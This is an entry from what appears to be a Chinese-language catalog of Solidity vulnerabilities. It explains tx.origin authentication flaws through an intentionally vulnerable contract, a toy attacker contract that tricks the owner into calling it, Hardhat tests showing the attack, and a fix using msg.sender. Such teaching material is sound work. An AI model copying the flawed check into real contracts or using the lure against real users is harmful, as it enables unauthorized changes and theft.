[后退](../README.md)
# tx.origin身份验证

**漏洞名称：tx.origin身份验证**  (Tx.origin Authentication)

**风险等级：** 高 

**漏洞描述：**

在以太坊中，我们发起一笔交易，该交易是由多个消息调用组成的，消息调用可以简单的看成是不同地址间的相互交互（包括外部地址和合约地址）。

在Solidity中，消息的调用者为`msg.sender`（看名字就知道是 `message`的`sender`）。

而整个交易的发起者为`tx.origin`，这里`tx`是指交易的意思。

因为合约不能自主执行，必须通过用户发起交易来触发，所以交易的发起者必定为外部地址（发起交易的玩家账号）。

任何一笔交易有且唯一一个`tx.origin`（交易发起者只会有一个）。


通常使用`msg.sender`作为权限验证，而`tx.origin`作为权限验证只用在某些特殊场景，例如验证不能为外部合约，或者某些无法判断`msg.sendr`的情况等。


如果本来应使用`msg.sender`而误用了`tx.origin`作权限验证，那么玩家在被诱导调用用一个恶意合约时，可以通过恶意合约调用验证合约的方式来通过权限验证。



举例说明如下：

1、使用`msg.sender`验证，它必须为A。

用户A调用合约B， 在B中，`msg.sender`为A，可以通过验证。

用户A被诱导调用恶意合约C，C再调用B时，在B中，`msg.sender`为C，而不是A，就无法通过验证。

2、使用`tx.origin`验证，它必须为A。

用户A调用合约B， 在B中，`tx.origin`为A，可以通过验证。

用户A被诱导调用恶意合约C，C再调用B，在B中，`tx.origin`仍然为A，可以通过验证。此时就会形成授权外的调用，造成不可控的后果。

让我们来看代码示例。



**示例代码语言：** Solidity

**漏洞示例代码：**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract B {
    uint public x;
    uint public y;

    address public owner;

    constructor(address _owner) {
        require(_owner != address(0), "zero address");
        owner = _owner;
    }

    function changeX(uint _x) external {
        require(msg.sender == owner, "not owner");
        x = _x;
    }

    function changeY(uint _y) external {
        require(tx.origin == owner,"not origin");
        y = _y;
    }
}

contract C {
    B public b;

    constructor(address _b) {
        require(_b != address(0));
        b = B(_b);
        b.x();
    }
    
    function attackX() external {
        b.changeX(789);
    }

    function attackY() external {
        b.changeY(789);
    }
}
```



**示例代码简介：**

在上面的代码中，`changeX`使用`msg.sender`验证而`changeY`使用`tx.origin`验证。
此时攻击者创建一个恶意合约C，诱导用户A去调用合约C中的`attackY`函数，就可以在未授权的情况下修改Y的值。

然而如果恶意合约调用`changeX`，就无法通过验证。



**单元测试代码：**

```javascript
// SPDX-License-Identifier: GPL-3.0
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("tx.origin Test", function () {
    let instance;
    let attack;
    let owner,user1;

    beforeEach( async function() {
        [owner,user1,] = await ethers.getSigners();

        let B = await ethers.getContractFactory("B");
        instance = await B.deploy(user1.address);
        
        let C = await ethers.getContractFactory("C");
        attack = await C.deploy(instance.address);
         
        
    });
    
    describe('tx.origin attack test', () => {
        it("user1 call changeX of B should be successful", async () => {
            await instance.connect(user1).changeX(6);
            expect(await instance.x()).to.be.equal(6);
        });

        it("user1 call changeY of B should be successful", async () => {
            await instance.connect(user1).changeY(8);
            expect(await instance.y()).to.be.equal(8);
        });

        it("user1 call attackY of C should be successfult", async () => {
            await attack.connect(user1).attackY();
            expect(await instance.y()).to.be.equal(789);
        });

        it("user1 call attackX of C should be failed", async () => {
            await expect(attack.connect(user1).attackX()).to.be.revertedWith("not owner");
            expect(await instance.y()).to.be.equal(0);
        });        
    });
});
```

在上面的测试代码中，使用恶意合约C调用合约B的`changeX`的时候，由于`msg.sender`验证通不过，整个交易会被重置并且可以收到提示消息`"not owner"`。

使用恶意合约C调用合约B的`changeY`的时候,可以通过`tx.origin`验证并修改Y的值，使之为一个不可控的值。



**真实案例：**

待补充。



**相关建议：**

1、除了在极特殊情况下（例如判断调用者必须为外部账号不能为合约）外，均使用`msg.sender`作为权限验证。如果一定要使用`tx.origin`，请咨询相关专业人员。